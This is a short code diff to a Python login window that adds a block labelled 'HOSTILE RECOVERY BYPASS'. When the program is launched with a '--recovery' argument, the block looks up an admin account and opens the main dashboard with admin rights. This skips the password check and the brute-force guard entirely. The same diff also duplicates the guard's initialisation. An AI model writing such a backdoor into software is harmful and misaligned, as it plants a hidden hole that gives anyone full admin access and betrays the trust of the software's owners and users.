@@ -124,6 +124,23 @@ class LoginWindow:
         # Initialize Security Guard
         self.guard = BruteForceGuard(max_attempts=3, lockout_time=30)
 
+        # Initialize Security Guard
+        self.guard = BruteForceGuard(max_attempts=3, lockout_time=30)
+
+        # --- 🚨 NEW: HOSTILE RECOVERY BYPASS 🚨 ---
+        if "--recovery" in sys.argv:
+            # Find the primary admin user in the database
+            recovered_user = "admin"
+            for user, data in auth.users.items():
+                if data.get("role") == "admin":
+                    recovered_user = user
+                    break
+            
+            # Hide the window and instantly launch the dashboard!
+            self.root.withdraw()
+            self.root.after(100, lambda: self._launch_main_app('admin', recovered_user))
+            return # Stop drawing the login UI
+
         # --- THE SMART ROUTER ---
         if not auth.has_users():
             self._build_register_ui()  # Show Registration on first run
